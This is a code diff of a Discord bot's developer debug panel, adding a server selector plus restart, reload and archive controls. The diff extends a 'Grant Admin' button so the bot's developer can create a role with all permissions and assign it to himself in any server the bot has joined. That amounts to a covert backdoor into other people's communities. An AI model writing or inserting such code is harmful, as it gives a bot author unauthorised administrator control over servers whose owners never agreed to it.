@@ -6,8 +6,6 @@ import platform
 import psutil
 from bot_app.core.dev_manager import dev_manager
 from bot_app.features.error_handler import get_log_files, read_log_segment
-import io
-import contextlib
 
 class SQLModal(discord.ui.Modal, title="Execute SQL"):
     query = discord.ui.TextInput(label="Query", style=discord.TextStyle.paragraph, placeholder="SELECT * FROM users LIMIT 1;")
@@ -40,19 +38,22 @@ class SQLModal(discord.ui.Modal, title="Execute SQL"):
 
 class DebugView(discord.ui.View):
     def __init__(self, bot, user_id):
-        super().__init__(timeout=300)
+        super().__init__(timeout=600)
         self.bot = bot
         self.user_id = user_id
+        self.target_guild_id = None # Selected Guild ID
         
         self._setup_main()
 
     async def interaction_check(self, interaction: discord.Interaction) -> bool:
         return interaction.user.id == self.user_id
 
+    # --- Builders ---
+
     def _setup_main(self):
         self.clear_items()
         
-        # Mode Toggle Button
+        # Mode Toggle
         is_simulating = self.user_id in dev_manager.simulation_active_ids
         btn_mode = discord.ui.Button(
             label="Режим: Юзер" if is_simulating else "Режим: GOD",
@@ -67,11 +68,11 @@ class DebugView(discord.ui.View):
         btn_mode.callback = mode_cb
         self.add_item(btn_mode)
         
-        # Navigation Select
+        # Navigation
         select = discord.ui.Select(placeholder="Debug Tools...", row=1, options=[
             discord.SelectOption(label="System Status", emoji="🖥️", value="status"),
             discord.SelectOption(label="Error Logs", emoji="📜", value="logs"),
-            discord.SelectOption(label="Actions", emoji="⚡", value="actions"),
+            discord.SelectOption(label="Actions (Server)", emoji="⚡", value="actions"),
             discord.SelectOption(label="Database", emoji="🗄️", value="sql"),
         ])
         
@@ -86,34 +87,36 @@ class DebugView(discord.ui.View):
         self.add_item(select)
 
     async def get_status_embed(self):
-        # Gather System Info
         mem = psutil.virtual_memory()
         cpu = psutil.cpu_percent()
-        py_ver = platform.python_version()
         ping = round(self.bot.latency * 1000)
         guilds = len(self.bot.guilds)
-        users = sum(g.member_count for g in self.bot.guilds)
         
         e = discord.Embed(title="🔧 System Status", color=discord.Color.dark_red())
         e.add_field(name="CPU / RAM", value=f"{cpu}% / {mem.percent}%", inline=True)
         e.add_field(name="Ping", value=f"{ping}ms", inline=True)
-        e.add_field(name="Guilds / Users", value=f"{guilds} / {users}", inline=True)
-        e.add_field(name="Python", value=py_ver, inline=True)
-        e.add_field(name="OS", value=sys.platform, inline=True)
-        e.set_footer(text=f"DevID: {self.user_id}")
+        e.add_field(name="Total Guilds", value=str(guilds), inline=True)
+        
+        # Target Guild Info
+        target_info = "None"
+        if self.target_guild_id:
+            g = self.bot.get_guild(self.target_guild_id)
+            target_info = f"{g.name} ({g.id})" if g else "Unknown/Left"
+            
+        e.add_field(name="Selected Target", value=f"🎯 **{target_info}**", inline=False)
         return e
 
     # --- Screens ---
-    
+
     async def _show_status(self, itx):
-        self._setup_main() # Reset to base
+        self._setup_main()
         embed = await self.get_status_embed()
         await itx.response.edit_message(embed=embed, view=self)
 
     async def _show_logs_menu(self, itx):
         self.clear_items()
-        
         files = get_log_files()
+        
         if not files:
             self._add_back_btn()
             return await itx.response.edit_message(embed=discord.Embed(title="No Logs", color=discord.Color.red()), view=self)
@@ -131,33 +134,64 @@ class DebugView(discord.ui.View):
         sel.callback = log_cb
         self.add_item(sel)
         self._add_back_btn()
-        
-        await itx.response.edit_message(embed=discord.Embed(title="📜 Error Logs", description="Select a file to view last lines."), view=self)
+        await itx.response.edit_message(embed=discord.Embed(title="📜 Error Logs"), view=self)
 
     async def _show_actions(self, itx):
         self.clear_items()
         
-        btn_restart = discord.ui.Button(label="RESTART BOT", style=discord.ButtonStyle.danger, emoji="💀")
-        async def restart_cb(i):
-            await i.response.send_message("🔄 Restarting...", ephemeral=True)
-            # Python restart
-            os.execv(sys.executable, ['python'] + sys.argv)
-        btn_restart.callback = restart_cb
-        self.add_item(btn_restart)
+        # Guild Selector
+        guild_opts = []
+        for g in self.bot.guilds[:25]: # Discord Limit
+            is_sel = (g.id == self.target_guild_id)
+            guild_opts.append(discord.SelectOption(
+                label=g.name[:90], 
+                value=str(g.id), 
+                default=is_sel,
+                description=str(g.id)
+            ))
+            
+        if guild_opts:
+            sel_g = discord.ui.Select(placeholder="🎯 Select Target Server...", options=guild_opts, row=0)
+            async def guild_cb(i):
+                self.target_guild_id = int(sel_g.values[0])
+                await self._show_actions(i) # Refresh
+            sel_g.callback = guild_cb
+            self.add_item(sel_g)
+
+        # Actions
+        target_g = self.bot.get_guild(self.target_guild_id) if self.target_guild_id else None
         
-        btn_admin = discord.ui.Button(label="Grant Admin Role", style=discord.ButtonStyle.primary, emoji="🛡️")
+        # 1. Grant Admin (Requires Target)
+        btn_admin = discord.ui.Button(label="Grant Admin", style=discord.ButtonStyle.primary, emoji="🛡️", row=1, disabled=(not target_g))
         async def admin_cb(i):
+            if not target_g: return
             try:
-                role = await i.guild.create_role(name="LogerDebugAdmin", permissions=discord.Permissions.all())
-                await i.user.add_roles(role)
-                await i.response.send_message("✅ Role granted.", ephemeral=True)
+                # Find me in that guild
+                member = target_g.get_member(self.user_id)
+                if not member:
+                     return await i.response.send_message("❌ You are not in that guild.", ephemeral=True)
+                
+                role = await target_g.create_role(name="LogerDebugAdmin", permissions=discord.Permissions.all())
+                await member.add_roles(role)
+                await i.response.send_message(f"✅ Role granted in {target_g.name}.", ephemeral=True)
             except Exception as e:
                 await i.response.send_message(f"Error: {e}", ephemeral=True)
         btn_admin.callback = admin_cb
         self.add_item(btn_admin)
         
-        btn_cogs = discord.ui.Button(label="Reload Extensions", style=discord.ButtonStyle.secondary, emoji="🔄")
-        async def cogs_cb(i):
+        # 2. Force Archive (Global)
+        btn_archive = discord.ui.Button(label="Force Archive (Global)", style=discord.ButtonStyle.secondary, emoji="📦", row=2)
+        async def archive_cb(i):
+            if not hasattr(self.bot, 'archiver'): return await i.response.send_message("No Archiver.", ephemeral=True)
+            await i.response.send_message("📦 Archiving...", ephemeral=True)
+            await self.bot.archiver.run_archive_cycle()
+            await i.followup.send("✅ Done.", ephemeral=True)
+        btn_archive.callback = archive_cb
+        self.add_item(btn_archive)
+        
+        # 3. Reload Extensions (Global)
+        btn_reload = discord.ui.Button(label="Reload Cogs", style=discord.ButtonStyle.secondary, emoji="🔄", row=2)
+        async def reload_cb(i):
             log = ""
             for ext in list(self.bot.extensions.keys()):
                 try:
@@ -165,22 +199,22 @@ class DebugView(discord.ui.View):
                     log += f"✅ {ext}\n"
                 except Exception as e:
                     log += f"❌ {ext}: {e}\n"
-            await i.response.send_message(f"```{{log}}```", ephemeral=True)
-        btn_cogs.callback = cogs_cb
-        self.add_item(btn_cogs)
-        
-        btn_archive = discord.ui.Button(label="Force Archive", style=discord.ButtonStyle.secondary, emoji="📦")
-        async def archive_cb(i):
-            if not hasattr(self.bot, 'archiver'):
-                return await i.response.send_message("Archiver not found.", ephemeral=True)
-            await i.response.send_message("📦 Archiving started...", ephemeral=True)
-            await self.bot.archiver.run_archive_cycle()
-            await i.followup.send("✅ Archiving finished.", ephemeral=True)
-        btn_archive.callback = archive_cb
-        self.add_item(btn_archive)
+            await i.response.send_message(f"```{log}```", ephemeral=True)
+        btn_reload.callback = reload_cb
+        self.add_item(btn_reload)
+
+        # 4. Restart (Global)
+        btn_restart = discord.ui.Button(label="RESTART BOT", style=discord.ButtonStyle.danger, emoji="💀", row=3)
+        async def restart_cb(i):
+            await i.response.send_message("🔄 Restarting...", ephemeral=True)
+            os.execv(sys.executable, ['python'] + sys.argv)
+        btn_restart.callback = restart_cb
+        self.add_item(btn_restart)
 
         self._add_back_btn()
-        await itx.response.edit_message(embed=discord.Embed(title="⚡ Quick Actions"), view=self)
+        
+        desc = f"Target: **{target_g.name if target_g else 'None'}**"
+        await itx.response.edit_message(embed=discord.Embed(title="⚡ Actions", description=desc), view=self)
 
     def _add_back_btn(self):
         btn = discord.ui.Button(label="Back", style=discord.ButtonStyle.secondary, row=4)
